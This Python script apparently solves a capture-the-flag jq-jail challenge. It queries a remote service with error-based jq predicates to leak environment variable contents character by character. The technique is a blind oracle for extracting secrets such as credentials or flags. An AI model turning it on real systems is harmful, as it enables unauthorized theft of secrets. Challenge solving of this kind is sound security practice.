#!/usr/bin/env python3
import json
from pathlib import Path
import solve_remote_live as base
from solve_set_oracle_v3_fixed import jq_accept_set, predicate

raw=json.loads(Path('chains_225.json').read_text())
vals=list(range(0,400))
exact={}
for k,ops in raw.items():
    acc=jq_accept_set('jq', vals, ops)
    if len(acc)==1:
        exact[next(iter(acc))]=ops
print('[+] exact predicates', len(exact), flush=True)

def q_scalar(conn, expr, lo=0, hi=160):
    qs=[]; vs=[]
    for v in range(lo,hi+1):
        if v in exact:
            qs.append(f'{expr}|{predicate(exact[v])}|error')
            vs.append(v)
    ans=conn.query_batch(qs)
    return [v for v,a in zip(vs,ans) if a=='error']

selectors=['env|flatten|sort|last','env|flatten|sort|first','env|keys|sort|last','env|keys|sort|first']
conn=base.RemoteOracle('challs.pyjail.club',20219,90)
try:
  for s in selectors:
    print('\n[*]',s,flush=True)
    for suf,label in [('length','len'),('explode|first','first'),('explode|last','last')]:
      hits=q_scalar(conn, f'{s}|{suf}', 0, 160)
      chars=''.join(chr(x) for x in hits if 32<=x<127)
      print(label,hits,chars,flush=True)
finally:
  conn.close()
